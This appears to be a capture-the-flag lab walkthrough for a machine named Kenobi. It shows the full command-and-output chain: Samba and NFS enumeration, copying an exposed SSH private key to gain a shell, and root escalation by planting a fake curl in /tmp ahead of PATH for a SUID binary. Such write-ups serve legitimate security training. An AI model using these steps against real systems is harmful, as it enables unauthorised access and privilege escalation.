## Scenario

> This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

Access via: `10.113.173.99`

## Initial Port Scan

### Question — Scan the machine with nmap, how many ports are open?

First pass was a full TCP port scan:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ sudo nmap -p- 10.113.173.99 -T4

[sudo] password for —REDACTED—: 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 18:18 +0200
Nmap scan report for 10.113.173.99
Host is up (0.035s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
33263/tcp open  unknown
36701/tcp open  unknown
51959/tcp open  unknown
54033/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds
```

**Breakdown:**

- `sudo` runs the scan with root privileges, which nmap needs for some scan types and for more accurate detection
- `nmap` the port scanner
- `-p-` scans all 65535 TCP ports, rather than nmap's default top 1000
- `10.113.173.99` the target IP
- `-T4` sets nmap's timing template to "aggressive," speeding the scan up at the cost of being more detectable

This came back with 10 ports open, but the answer box only had space for a single digit, so a full port sweep wasn't the intended step here. Switching to nmap's default scan (its top 1000 ports) gave a cleaner result:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ sudo nmap 10.113.173.99     

Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 18:20 +0200
Nmap scan report for 10.113.173.99
Host is up (0.036s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
```

**Breakdown:**

- `sudo nmap 10.113.173.99` same as above, with no extra flags, so nmap falls back to its default top-1000-port TCP scan

This came back with fewer ports open, matching the single-digit answer field.

**Answer:** `—REDACTED—`

## Enumerating Samba for Shares

Ran a version/script scan against the two SMB ports to get a baseline read on the service:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ nmap -p139,445 -sV -sC 10.113.173.99 

Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 18:22 +0200
Nmap scan report for 10.113.173.99
Host is up (0.035s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-11-14T16:22:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds
```

**Breakdown:**

- `nmap` the port scanner
- `-p139,445` restricts the scan to ports 139 and 445, the two SMB ports
- `-sV` probes open ports to determine the service/version running on them
- `-sC` runs nmap's default set of safe scripts against each detected service
- `10.113.173.99` the target IP

This confirmed Samba (version 4 of the daemon) on both SMB ports but gave no share listing.

### Question — Using the nmap command above, how many shares have been found?

Tried the share-enumeration scripts the task pointed at:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ nmap -p139,445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.113.173.99

Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 18:22 +0200
Nmap scan report for 10.113.173.99
Host is up (0.035s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.04 seconds
```

**Breakdown:**

- `nmap` the port scanner
- `-p139,445` same port restriction as before
- `--script=smb-enum-shares.nse,smb-enum-users.nse` loads two NSE scripts: one lists SMB shares, one lists SMB users
- `10.113.173.99` the target IP

Neither script produced any output — no share list and no user list. Fell back to `smbclient` to list shares directly instead:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ smbclient -L //10.113.173.99 -N                                                                               

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.113.173.99 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

**Breakdown:**

- `smbclient` the SMB command-line client
- `-L //10.113.173.99` lists the shares available on the host at that address, rather than connecting to one of them
- `-N` suppresses the password prompt, authenticating as a null/anonymous session

The listing showed the shares `print$`, `anonymous`, and `IPC$`. The SMB1 workgroup-listing attempt underneath failed, but that's just `smbclient` trying an older protocol to grab the workgroup name for display — it doesn't affect the share list above it.

**Answer:** `—REDACTED—`

### Question — Once you're connected, list the files on the share. What is the file can you see?

Connected to the `anonymous` share and listed its contents:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ smbclient //10.113.173.99/anonymous -N 

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 13:49:09 2019
  ..                                  D        0  Sat Aug  9 16:03:22 2025
  —REDACTED—                             N    12237  Wed Sep  4 13:49:09 2019

		9183416 blocks of size 1024. 2931448 blocks available
smb: \> get —REDACTED—
getting file \—REDACTED— of size 12237 as —REDACTED— (57.2 KiloBytes/sec) (average 57.2 KiloBytes/sec)
```

**Breakdown:**

- `smbclient //10.113.173.99/anonymous` connects directly to the `anonymous` share, rather than just listing shares as `-L` did above
- `-N` same as before, null/anonymous authentication
- `ls`, run inside the `smbclient` shell, lists the contents of the current share directory
- `get —REDACTED—`, also run inside the `smbclient` shell, downloads `—REDACTED—` from the share to the local working directory

Tried `smbget` afterwards to grab the whole share recursively, as the task pointed to:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ smbget -R smb://10.113.173.99/anonymous 

handle_name_resolve_order: WARNING: Ignoring invalid list value 'smb://10.113.173.99/anonymous' for parameter 'name resolve order'
Downloaded 0b in 0 seconds
```

**Breakdown:**

- `smbget` another SMB download utility, separate from `smbclient`
- `-R` recurses into subdirectories
- `smb://10.113.173.99/anonymous` the share URL

It reported downloading 0 bytes — no error, just nothing transferred — so this didn't pan out. The file was already in hand from `get` inside `smbclient`, so it didn't matter. Decided to just ignore all hand-holding from this room entirely from here on, given none of them worked so far. 

**Answer:** `—REDACTED—`

### Question — What port is FTP running on?

Read the downloaded file from inside the `smbclient` session:

```shell
smb: \> !cat —REDACTED—

Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+----------------+
|                |
| ..             |
| . o. .         |
| ..=o +.        |
| . So.o++o.     |
| o ...+oo.Bo*o  |
| o o ..o.o+.@oo |
| . . . E .O+= . |
| . .   oBo.     |
+----------------+

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21

# Don't use IPv6 support by default.
UseIPv6				off
—SNIP—
```

**Breakdown:**

- `!cat —REDACTED—`, run inside the `smbclient` shell — the leading `!` passes the rest of the line to the local shell rather than treating it as an `smbclient` command, so this runs `cat` on the local copy of `—REDACTED—`

The file turned out to hold two unrelated things: the output of generating an SSH key pair for the `kenobi` user, and a sample `proftpd.conf` showing the FTP port. This same number was already visible in the earlier full-port-range nmap scan, so it could have been read off that instead of needing the file.

**Answer:** `—REDACTED—`

### Question — What mount can we see?

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ showmount -e 10.113.173.99

Export list for 10.113.173.99:
—REDACTED— *
```

**Breakdown:**

- `showmount` queries an NFS server's mount daemon for its export list
- `-e` shows the server's list of exported directories
- `10.113.173.99` the target IP

One export, available to any client (`*`).

**Answer:** `—REDACTED—`

## Gain Initial Access with ProFTPD

Rather than connecting with netcat as the task suggested, the ProFTPD version was already sitting in an earlier, broader nmap scan I had run earlier:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ sudo nmap 10.113.173.99 -p21,22,80,111,139,445,2049 -sV -sC                 

Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 18:32 +0200
Nmap scan report for 10.113.173.99
Host is up (0.035s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD —REDACTED—
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 16:d2:04:2c:7e:b0:e1:45:a2:24:15:30:1c:a4:3c:47 (RSA)
|   256 0e:24:48:6c:88:fc:4f:83:86:00:91:75:57:09:f7:de (ECDSA)
|_  256 af:32:5f:f2:c1:b5:42:c3:07:9f:4e:af:42:e9:34:91 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38350/udp6  mountd
|   100005  1,2,3      41838/udp   mountd
|   100005  1,2,3      51395/tcp6  mountd
|   100005  1,2,3      54033/tcp   mountd
|   100021  1,3,4      33263/tcp   nlockmgr
|   100021  1,3,4      33931/tcp6  nlockmgr
|   100021  1,3,4      43857/udp   nlockmgr
|   100021  1,3,4      55229/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-11-14T16:32:22
|_  start_date: N/A
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
```

**Breakdown:**

- `sudo nmap 10.113.173.99` run with root privileges against the target
- `-p21,22,80,111,139,445,2049` restricts the scan to the seven ports already known to be open, rather than rescanning the default top 1000
- `-sV` service/version detection
- `-sC` default safe script set

This one scan answered several questions in this task at once, since it had already been run for other purposes earlier and just wasn't pasted at the time.

### Question — Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?

Read straight off the scan above rather than connecting with netcat separately.

**Answer:** `—REDACTED—`

### Question — How many exploits are there for the ProFTPd running?

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ searchsploit proftpd —REDACTED—                                   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd —REDACTED— - 'mod_copy' Command Execution (Metasploit)                                                                                                                                                 | linux/remote/37262.rb
ProFTPd —REDACTED— - 'mod_copy' Remote Command Execution                                                                                                                                                       | linux/remote/36803.py
ProFTPd —REDACTED— - 'mod_copy' Remote Command Execution (2)                                                                                                                                                   | linux/remote/49908.py
ProFTPd —REDACTED— - File Copy                                                                                                                                                                                 | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

**Breakdown:**

- `searchsploit` searches a local copy of the Exploit-DB database for matching exploit titles
- `proftpd —REDACTED—` the search terms — software name and version

The results were all variations on the same `mod_copy` file-copy vulnerability.

**Answer:** `—REDACTED—`

It wasn't clear why the task walked through `searchsploit` in this much detail when the next step skips straight to the NFS mount instead of actually running one of these exploits against the FTP service.

With the `/var` export already known from the previous task, mounted it locally:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ mkdir /tmp/kenobiNFS 

┌──(—REDACTED—㉿kali)-[~]
└─$ cd /tmp/kenobiNFS/

┌──(—REDACTED—㉿kali)-[/tmp/kenobiNFS]
└─$ sudo mount 10.113.173.99:/var /tmp/kenobiNFS

┌──(—REDACTED—㉿kali)-[/tmp/kenobiNFS]
└─$ ls -la                   

total 0
drwxrwxr-x  2 —REDACTED— —REDACTED—  40 Nov 14 18:36 .
drwxrwxrwt 13 root  root  320 Nov 14 18:36 ..
```

**Breakdown:**

- `mkdir /tmp/kenobiNFS` creates an empty local directory to use as the mount point
- `cd /tmp/kenobiNFS/` moves into that directory
- `sudo mount 10.113.173.99:/var /tmp/kenobiNFS` mounts the remote NFS export `/var` from the target onto the local `/tmp/kenobiNFS` directory, with root privileges since mounting filesystems normally requires them
- `ls -la` lists the mount point's contents, including hidden entries

This came back empty, which didn't look right for a mounted share holding an entire `/var`. Backed out of the directory and back in to force a fresh listing:

```shell
┌──(—REDACTED—㉿kali)-[/tmp/kenobiNFS]
└─$ cd ..        

┌──(—REDACTED—㉿kali)-[/tmp]
└─$ cd kenobiNFS 

┌──(—REDACTED—㉿kali)-[/tmp/kenobiNFS]
└─$ ls -la

total 52
drwxr-xr-x 14 root root         4096 Sep  4  2019 .
drwxrwxrwt 13 root root          320 Nov 14 18:36 ..
drwxr-xr-x  2 root root         4096 Sep  4  2019 backups
drwxr-xr-x 15 root root         4096 Aug 10  2025 cache
drwxrwxrwt  2 root root         4096 Sep  4  2019 crash
drwxr-xr-x 51 root root         4096 Aug 10  2025 lib
drwxrwsr-x  2 root staff        4096 Apr 12  2016 local
lrwxrwxrwx  1 root root            9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 13 root kali-trusted 4096 Nov 14 18:17 log
drwxrwsr-x  2 root mail         4096 Feb 27  2019 mail
drwxr-xr-x  2 root root         4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root            4 Sep  4  2019 run -> /run
drwxr-xr-x  5 root root         4096 Aug  9  2025 snap
drwxr-xr-x  5 root root         4096 Sep  4  2019 spool
drwxrwxrwt  8 root root         4096 Nov 14 18:24 tmp
drwxr-xr-x  3 root root         4096 Sep  4  2019 www
```

**Breakdown:**

- `cd ..` moves up out of the mount point
- `cd kenobiNFS` moves back into it
- `ls -la` lists contents again

This time the full contents of the target's `/var` showed up, `tmp` among them — the one that matters here.

```shell
┌──(—REDACTED—㉿kali)-[/tmp/kenobiNFS]
└─$ cd tmp      
                                                                                                                                                                                                                                            
┌──(—REDACTED—㉿kali)-[/tmp/kenobiNFS/tmp]
└─$ ls

cloud-init                                                                    systemd-private-0ca19a943f7644e88d8402141cf711ce-systemd-logind.service-qk8Och
id_rsa                                                                        systemd-private-0ca19a943f7644e88d8402141cf711ce-systemd-resolved.service-AtXUkj
systemd-private-0ca19a943f7644e88d8402141cf711ce-apache2.service-XceVSf       systemd-private-0ca19a943f7644e88d8402141cf711ce-systemd-timesyncd.service-II85si
systemd-private-0ca19a943f7644e88d8402141cf711ce-ModemManager.service-UfsR1e

┌──(—REDACTED—㉿kali)-[/tmp/kenobiNFS/tmp]
└─$ cp id_rsa /tmp/    

┌──(—REDACTED—㉿kali)-[/tmp]
└─$ sudo chmod 600 id_rsa 
```

**Breakdown:**

- `cd tmp` moves into `/var/tmp` on the target, as seen through the mount
- `ls` lists its contents
- `cp id_rsa /tmp/` copies the key from the mounted share into the local `/tmp`, outside the mount
- `sudo chmod 600 id_rsa` tightens the local copy's permissions to owner read/write only — `ssh` refuses to use a private key that's readable by anyone else

`id_rsa` was already sitting in `/var/tmp` without having to run the `mod_copy` exploit from the task to put it there — whatever the lab's intended path, it turned up directly through the NFS mount.

```shell
┌──(—REDACTED—㉿kali)-[/tmp]
└─$ ssh kenobi@10.113.173.99 -i id_rsa          

—SNIP—

kenobi@kenobi:~$ 
```

**Breakdown:**

- `ssh kenobi@10.113.173.99` connects over SSH as the `kenobi` user
- `-i id_rsa` uses the copied private key for authentication instead of a password

This landed a shell as `kenobi`.

### Question — What is Kenobi's user flag (/home/kenobi/user.txt)?

```shell
kenobi@kenobi:~$ cat /home/kenobi/user.txt 

—REDACTED—
```

**Breakdown:**

- `cat /home/kenobi/user.txt` prints the flag file's contents

**Answer:** `—REDACTED—`

## Privilege Escalation with Path Variable Manipulation

### Question — What file looks particularly out of the ordinary?

```shell
kenobi@kenobi:~$ find / -perm -04000 -ls 2>/dev/null

      875     84 -rwsr-xr-x   1 root     root        85064 Feb  6  2024 /snap/core20/2599/usr/bin/chfn
      881     52 -rwsr-xr-x   1 root     root        53040 Feb  6  2024 /snap/core20/2599/usr/bin/chsh
      951     87 -rwsr-xr-x   1 root     root        88464 Feb  6  2024 /snap/core20/2599/usr/bin/gpasswd
     1035     55 -rwsr-xr-x   1 root     root        55528 Apr  9  2024 /snap/core20/2599/usr/bin/mount
     1044     44 -rwsr-xr-x   1 root     root        44784 Feb  6  2024 /snap/core20/2599/usr/bin/newgrp
     1059     67 -rwsr-xr-x   1 root     root        68208 Feb  6  2024 /snap/core20/2599/usr/bin/passwd
     1169     67 -rwsr-xr-x   1 root     root        67816 Apr  9  2024 /snap/core20/2599/usr/bin/su
     1170    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/2599/usr/bin/sudo
     1228     39 -rwsr-xr-x   1 root     root        39144 Apr  9  2024 /snap/core20/2599/usr/bin/umount
     1317     51 -rwsr-xr--   1 root     systemd-network    51344 Oct 25  2022 /snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1691    467 -rwsr-xr-x   1 root     root              477672 Apr 11  2025 /snap/core20/2599/usr/lib/openssh/ssh-keysign
   261409    120 -rwsr-xr-x   1 root     root              121688 Apr  2  2024 /sbin/mount.nfs
   277170     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   264498     52 -rwsr-xr--   1 root     messagebus         51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   264419    156 -rwsr-xr-x   1 root     root              159304 Jan 15  2025 /usr/lib/snapd/snap-confine
   264369     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   262939    468 -rwsr-xr-x   1 root     root              477672 Apr 11  2025 /usr/lib/openssh/ssh-keysign
   266377    848 -rwsr-xr-x   1 root     root              866448 Feb  3  2022 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   260509     84 -rwsr-xr-x   1 root     root               85064 Feb  6  2024 /usr/bin/chfn
   333095     48 -rwsr-xr-x   1 root     root               45648 Feb  6  2024 /usr/bin/newgidmap
   277161     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 /usr/bin/pkexec
   265064     68 -rwsr-xr-x   1 root     root               68208 Feb  6  2024 /usr/bin/passwd
   333096     44 -rwsr-xr-x   1 root     root               41552 Feb  6  2024 /usr/bin/newuidmap
   265063     88 -rwsr-xr-x   1 root     root               88464 Feb  6  2024 /usr/bin/gpasswd
   280011     12 -rwsr-xr-x   1 root     root                8880 Sep  4  2019 —REDACTED—
   264198    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
   264766     52 -rwsr-xr-x   1 root     root               53040 Feb  6  2024 /usr/bin/chsh
   265275     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
   260368     44 -rwsr-xr-x   1 root     root               44784 Feb  6  2024 /usr/bin/newgrp
   260721     40 -rwsr-xr-x   1 root     root               39144 Apr  9  2024 /bin/umount
   260714     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /bin/fusermount
   260180     56 -rwsr-xr-x   1 root     root               55528 Apr  9  2024 /bin/mount
   263460     68 -rwsr-xr-x   1 root     root               67816 Apr  9  2024 /bin/su
```

**Breakdown:**

- `find /` searches starting from the filesystem root
- `-perm -04000` matches files that have the SUID bit set (the `4000` permission bit), regardless of their other permission bits
- `-ls` prints each match in a detailed, `ls -l`-style listing instead of just the path
- `2>/dev/null` redirects stderr to `/dev/null`, discarding the "Permission denied" noise from directories the current user can't read

Most of this list is the usual suspects — `passwd`, `sudo`, `su`, `mount`, and a batch of `snap` core packages. Not being deeply familiar with what's "normal" on an Ubuntu system made it hard to be certain, but `—REDACTED—` stood out against the rest, since every other entry is a well-known system binary and this one isn't.

**Answer:** `—REDACTED—`

### Question — Run the binary, how many options appear?

```shell
kenobi@kenobi:~$ —REDACTED—

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :^C
```

**Breakdown:**

- `—REDACTED—` runs the binary by its full path

The menu listed status check, kernel version, and ifconfig. Cancelled out of the prompt rather than picking one yet.

**Answer:** `—REDACTED—`

Next, pulled the binary's embedded strings to see what it's doing under the hood:

```shell
kenobi@kenobi:~$ strings —REDACTED—

/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
```

**Breakdown:**

- `strings` scans a binary file for sequences of printable characters, a quick way to see hardcoded text without disassembling it
- `—REDACTED—` the file to scan

Each menu option maps to a shell command baked into the binary: `curl -I localhost`, `uname -r`, and `ifconfig`. None of them are called by their full path (`/usr/bin/curl`, `/usr/bin/uname`, `/usr/bin/ifconfig`), which means the binary relies on the `PATH` environment variable to find them at runtime. Combined with the `setuid` string also present — meaning the program calls `setuid()` to run as the file's owner (root, per its permissions) rather than the invoking user — this gave a way in: if a fake `curl` could be placed somewhere earlier in `PATH` than the real one, the menu would run that instead, as root.

### Question — What is the root flag (/root/root.txt)?

First found a directory to drop a fake binary into:

```shell
kenobi@kenobi:~$ find / -writable -type d 2>/dev/null

/var/crash
/var/spool/samba
/var/tmp
/var/tmp/cloud-init
/var/lib/samba/usershares
/var/lib/lxcfs/proc
/var/lib/lxcfs/sys
/var/lib/lxcfs/sys/devices
/var/lib/lxcfs/sys/devices/system
/var/lib/lxcfs/sys/devices/system/cpu
/var/lib/lxcfs/cgroup
/proc/2592/task/2592/fd
/proc/2592/fd
/proc/2592/map_files
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/tmp
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/.X11-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/home/kenobi
/home/kenobi/.ssh
/home/kenobi/.cache
/home/kenobi/share
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/units
/run/screen
/run/cloud-init/tmp
/run/lock
/dev/mqueue
/dev/shm
```

**Breakdown:**

- `find /` searches from the filesystem root
- `-writable` matches only entries the current user can write to
- `-type d` restricts matches to directories
- `2>/dev/null` discards permission-denied noise, as before

Plenty of options came back, but plain old `/tmp` is the obvious choice — world-writable and already on the default `PATH`.

```shell
kenobi@kenobi:~$ export PATH=/tmp:$PATH
kenobi@kenobi:~$ echo $PATH

/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

**Breakdown:**

- `export PATH=/tmp:$PATH` rebuilds the `PATH` variable with `/tmp` prepended ahead of the existing value (`$PATH`), so directories are searched in order and `/tmp` is checked first
- `echo $PATH` prints the resulting value to confirm the change took

```shell
kenobi@kenobi:~$ echo /bin/sh > /tmp/curl
kenobi@kenobi:~$ cat /tmp/curl

/bin/sh

kenobi@kenobi:~$ chmod 777 /tmp/curl
```

**Breakdown:**

- `echo /bin/sh > /tmp/curl` writes the text `/bin/sh` into a new file at `/tmp/curl`, creating a fake `curl` that's really just a script that launches a shell
- `cat /tmp/curl` confirms the file's contents
- `chmod 777 /tmp/curl` makes the fake binary readable, writable and executable by everyone, since `—REDACTED—` will need to execute it

Given the whole point of this task was demonstrating path manipulation, there wasn't much doubt this would work, but it was worth confirming anyway.

```shell
kenobi@kenobi:~$ —REDACTED—

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami

root
```

**Breakdown:**

- `—REDACTED—` runs the SUID binary again, now with the manipulated `PATH` in place
- `1` selects "status check," which the earlier `strings` output showed runs `curl -I localhost` with no full path, so it picks up the fake `curl` in `/tmp` first
- `whoami`, run inside the shell that popped, confirms the effective user

The fake `curl` launched `/bin/sh` in its place, and because `—REDACTED—` runs with `setuid` as root, that shell came up as root too.

```shell
# cat /root/root.txt

—REDACTED—
```

**Breakdown:**

- `cat /root/root.txt` prints the root flag file

**Answer:** `—REDACTED—`